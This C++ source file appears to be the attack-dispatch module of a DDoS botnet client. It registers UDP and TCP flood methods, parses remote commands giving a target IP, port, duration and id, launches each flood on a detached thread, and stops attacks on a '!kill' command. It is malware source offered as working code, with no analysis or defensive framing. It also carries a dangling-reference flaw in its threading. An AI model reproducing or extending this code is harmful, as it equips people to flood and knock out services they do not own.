#include "headers/attack.hpp"

#include <map>
#include <sstream>
#include <thread>

#include "headers/config.hpp"
#include "headers/main.hpp"
#include "headers/methods.hpp"
#include "headers/utils.hpp"

AttackReg Areg;
map<unsigned int, Attack> Attacks;
int AttacksC;

/* Init methods */
void Init() {
  Areg.AddMethod("!udpmix", UdpmixMethod);
  Areg.AddMethod("!tcpmix", TcpmixMethod);
}

AttackStruct ParseAttack(string command) {
  istringstream stream(command);
  string id;
  struct AttackStruct as;

  stream >> as.Name >> as.Ip >> as.Port >> as.Duration >> id;
  as.ID = stoi(id.substr(3));

  return as;
}

void Attack::Start() {
  thread t([&]() {
    Areg.LaunchMethod(as.Name, as.Ip, as.Port, as.Duration, stop);
  });
  t.detach();
}

void Attack::Stop() {
  *this->stop = true;
  if (Attacks.find(as.ID) != Attacks.end()) {
    Attacks.erase(as.ID);
  }
}

void CommandHandler(string res) {
  if (res.find("!kill") == 0) {
    int id = stoi(res.substr(5));

    auto it = Attacks.find(id);
    if (it != Attacks.end()) {
#ifdef DEBUG
      printf("[%s] Attack stopped (by client) with id: %d\n", it->second.as.Name.substr(1).c_str(), id);
#endif
      it->second.Stop();
      return;
    }

    return;
  }

  if (AttacksC >= MAX_ATTACKS) {
#ifdef DEBUG
    printf("[DEBUG] Attacks > MAX_ATTACKS\n");
#endif
    return;
  }
  AttacksC++;

  AttackStruct as = ParseAttack(res);
  Attack a(as);

  a.SetStop(new bool());
  Attacks[as.ID] = a;
  a.Start();
}
